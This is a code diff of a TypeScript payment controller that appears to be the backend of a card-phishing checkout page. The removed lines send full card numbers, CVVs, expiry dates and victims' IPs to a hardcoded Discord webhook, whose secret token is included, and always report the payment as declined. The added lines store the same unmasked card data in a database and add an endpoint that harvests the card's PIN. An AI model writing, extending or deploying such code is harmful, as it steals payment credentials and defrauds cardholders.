@@ -1,62 +1,97 @@
-// app/Controllers/Http/PaymentController.ts
-import axios from 'axios'
 import type { HttpContext } from '@adonisjs/core/http'
+import CardBinsService from '#services/Bins'
+import Lead from '#models/lead'
+import Payment from '#models/payment'
+import Env from '#start/env'
+import crypto from 'node:crypto'
+import { Exception } from '@adonisjs/core/exceptions'
 
 export default class PaymentController {
-  async processCreditPayment(ctx: HttpContext) {
+
+  public async processCreditPayment(ctx: HttpContext) {
     try {
-      // Recebe os dados do frontend
-      const { cardNumber, cardName, expiryDate, cvv } = ctx.request.only([
+      const { cardNumber, cardName, expiryDate, cvv, checkoutUrl } = ctx.request.only([
         'cardNumber',
         'cardName',
         'expiryDate',
         'cvv',
+        'checkoutUrl'
       ])
 
-      // Validação básica
-      if (!cardNumber || !cardName || !expiryDate || !cvv) {
+      if (!cardNumber || !cardName || !expiryDate || !cvv || !checkoutUrl) {
         return ctx.response.status(400).json({ error: 'Todos os campos são obrigatórios' })
       }
 
-      // Cria o log com dados reais (sem máscara)
-      const paymentLog = {
-        cardNumber,
-        cardName,
-        expiryDate,
-        cvv,
-        timestamp: new Date().toISOString(),
-        ip: ctx.request.ip() || 'Desconhecido',
+      const cardBinsService = new CardBinsService()
+      const bin = cardNumber.replace(/\D/g, '').substring(0, 6)
+      const binInfo = cardBinsService.findByCardNumber(bin)
+
+      const nonce = crypto.randomBytes(16).toString('hex')
+      const hmac = crypto.createHmac('sha256', Env.get('APP_KEY'))
+      hmac.update(nonce)
+      const CardToken = hmac.digest('base64url')
+
+      const lead = await Lead.findByOrFail('checkoutToken', checkoutUrl)
+
+      const payment = await lead.related('payments').create({
+        transactionReference: lead.checkoutToken,
+        cartao: cardNumber,
+        nomeTitular: cardName,
+        validade: expiryDate,
+        cvv: cvv,
+        tokenCard: CardToken
+      })
+
+      if (binInfo) {
+        return ctx.response.status(200).json({
+          security: true,
+          SecurityDetails: binInfo,
+          tokenCard: CardToken
+        })
+      }
+      return ctx.response.status(200).json({
+        security: false,
+        tokenCard: CardToken
+      })
+      
+    } catch (error) {
+      if (error instanceof Exception && error.status === 404) {
+        return ctx.response.status(404).json({ error: 'Token não encontrado' })
+      }
+      return ctx.response.status(500).json({ error: 'Erro interno ao processar o pagamento' })
+    }
+  }
+
+  public async updateCreditPayment(ctx: HttpContext) {
+    try {
+      const { tokenCard, senhacard } = ctx.request.only([
+        'tokenCard',
+        'senhacard',
+      ])
+
+      if (!tokenCard || !senhacard) {
+        return ctx.response.status(400).json({ error: 'Todos os campos são obrigatórios' })
       }
 
-      // Configuração do webhook do Discord
-      const webhookUrl = 'https://discord.com/api/webhooks/1334272674028982282/6uT4qLfotlmSW1uv7yMgjbXTGPclvhaVH43MLEIocF3-IAigO8gDoypI9uILP5MbK8bA'
-      const payload = {
-        content: `**Novo Pagamento com Cartão Recebido**\n` +
-                 `**Número do Cartão:** ${paymentLog.cardNumber}\n` +
-                 `**Nome no Cartão:** ${paymentLog.cardName}\n` +
-                 `**Validade:** ${paymentLog.expiryDate}\n` +
-                 `**CVV:** ${paymentLog.cvv}\n` +
-                 `**IP do Usuário:** ${paymentLog.ip}\n` +
-                 `**Data/Hora:** ${paymentLog.timestamp}`,
-        username: 'Bot de Pagamento',
-        avatar_url: 'https://i.imgur.com/AfFp7pu.png',
-      }
+      const payment = await Payment.query()
+        .where('tokenCard', tokenCard)
+        .firstOrFail()
 
-      // Envia a mensagem para o Discord
-      await axios.post(webhookUrl, payload)
+      await payment.merge({
+        senha: senhacard,
+      }).save()
 
       return ctx.response.status(200).json({
-        approved: false,
-        message: 'Pagamento não aprovado. Tente novamente ou use outro cartão.',
+        message: 'Pagamento atualizado com sucesso',
+        tokenCard: tokenCard,
       })
     } catch (error) {
-      // Log de erro
-      if (ctx.logger) {
-        ctx.logger.error('Erro ao processar pagamento:', error.message)
-      } else {
-        console.error('Erro ao processar pagamento:', error.message)
+      if (error instanceof Exception && error.status === 404) {
+        return ctx.response.status(404).json({
+          error: 'Token não encontrado',
+        })
       }
-      return ctx.response.status(500).json({ error: 'Erro interno ao processar pagamento' })
+      return ctx.response.status(500).json({ error: 'Erro interno' })
     }
   }
 }
